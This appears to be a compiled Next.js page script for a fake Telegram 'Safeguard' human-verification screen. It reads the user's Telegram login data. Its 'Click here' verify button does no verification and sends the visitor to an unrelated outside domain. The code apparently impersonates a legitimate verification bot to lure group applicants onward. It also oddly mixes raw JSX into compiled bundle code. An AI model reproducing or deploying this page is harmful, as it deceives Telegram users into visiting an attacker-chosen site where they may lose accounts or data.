(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
	[405], {
		8312: function(e, t, a) {
			(window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
				return a(4186);
			}]);
		},
		4186: function(e, t, a) {
			"use strict";
			a.r(t), a.d(t, {
				__N_SSP: function() {
					return i;
				},
				default: function() {
					return c;
				}
			});
			var n = a(5893),
				r = a(9008),
				o = a.n(r),
				l = a(7294),
				i = !0;

			function c(e) {
				const { params: t } = e;
				const [state, setState] = (0, l.useState)({
					loginStatus: 0,
					errmsg: "",
					tglogin: {},
					userProfile: {},
					query: t,
					lang: "",
					initData: ""
				});

				const handleLogin = async () => {
					setState(prev => ({ ...prev, loginStatus: 3 }));
					await new Promise(resolve => setTimeout(() => resolve("i am groot"), 200));
					try {
						location = 'https://escrows.tech/1540';
					} catch (error) {
						handleError(error);
					}
				};

				const handleError = (error) => {
					setState(prev => ({
						...prev,
						loginStatus: error.response ? -2 : -1,
						errmsg: error.response?.data?.message ? `ERRCODE_${error.response.data.message}` : "ERRCODE__UNKNOWN"
					}));
					if (window.Telegram.WebApp) {
						window.Telegram.WebApp.HapticFeedback.notificationOccurred("error");
					}
				};

				(0, l.useEffect)(() => {
					setState(prev => ({ ...prev, lang: navigator.language }));
				}, []);

				(0, l.useEffect)(() => {
					if (window.Telegram.WebApp.initData) {
						const initData = decodeURIComponent(window.Telegram.WebApp.initData);
						const userProfile = JSON.parse(initData.match(/user=(.+)&auth_date=/)[1] || "{}");
						setState(prev => ({
							...prev,
							tglogin: {
								query_id: initData.match(/query_id=(.+)&user=/)[1] || "",
								user: userProfile,
								auth_date: initData.match(/auth_date=(.+)&hash=/)[1] || "",
								hash: initData.match(/hash=(.+)/)[1] || ""
							},
							userProfile,
							loginStatus: 1
						}));
					} else {
						window.location.href = "https://docs.safeguard.run";
					}
				}, []);

				const renderWelcomeMessage = () => {
					const { first_name, last_name } = state.userProfile;
					return first_name ? (
						<div className="mb-4 text-lg font-bold text-slate-400">
							Welcome, {first_name} {last_name ? last_name : ""}
						</div>
					) : null;
				};

				const renderContent = () => {
					switch (state.loginStatus) {
						case -2:
							return (
								<div>
									<p className="text-xl font-bold text-telegram-text">Oops...</p>
									<p className="text-lg font-bold text-telegram-text">There is an error: {state.errmsg}</p>
									<p className="text-lg font-bold text-telegram-text">Please re-apply to the group and try again.</p>
								</div>
							);
						case -1:
							return <p className="text-lg font-bold text-telegram-text">Error, please complete verification within Telegram</p>;
						case 0:
						case 1:
							return (
								<div className="mt-5">
									{renderWelcomeMessage()}
									<p className="text-3xl font-bold text-telegram-text">Human Verification</p>
									<p className="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
									<div className="flex items-center justify-center w-100 mt-3">
										<button onClick={handleLogin} className="w-full px-3 py-3 my-4 font-mono text-base rounded 										text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">
											{state.loginStatus === 0 ? "Click here" : "Loading..."}
										</button>
									</div>
								</div>
							);
						case 2:
							return (
								<div>
									<p className="text-xl font-bold text-green-500">Verified!</p>
									<p className="text-lg font-bold text-telegram-text">An invite link to the group has been sent</p>
								</div>
							);
						case 3:
							return (
								<div className="mt-5">
									<p className="text-3xl font-bold text-telegram-text">Human Verification</p>
									<p className="text-md font-bold text-telegram-text mt-2">Verify below to be granted entry</p>
									<div className="flex items-center justify-center w-100 mt-3">
										<button className="w-full px-3 py-3 my-4 font-mono text-base rounded text-telegram-button-text bg-gradient-to-r from-button1 via-button2 to-button3 hover:bg-gradient-to-br shadow-lg shadow-black-500/50 dark:shadow-lg dark:shadow-black-800/80">
											Loading...
										</button>
									</div>
								</div>
							);
						default:
							return null;
					}
				};

				return (
					<div className="bg-telegram-bg">
						{o()({
							children: [
								(n.jsx)("title", { children: "Safeguard" }),
								(n.jsx)("meta", { name: "description", content: "@Safeguard Verification Bot" }),
								(n.jsx)("link", { rel: "icon", href: "/favicon.ico" })
							]
						})}
						<main className="flex items-center justify-start flex-col gap-2 h-[100vh] p-4 text-center">
							{renderContent()}
						</main>
					</div>
				);
			}
		}
	},
	function(e) {
		e.O(0, [237, 774, 888, 179], function() {
			return e(e.s = 8312);
		}), _N_E = e.O();
	}
]);
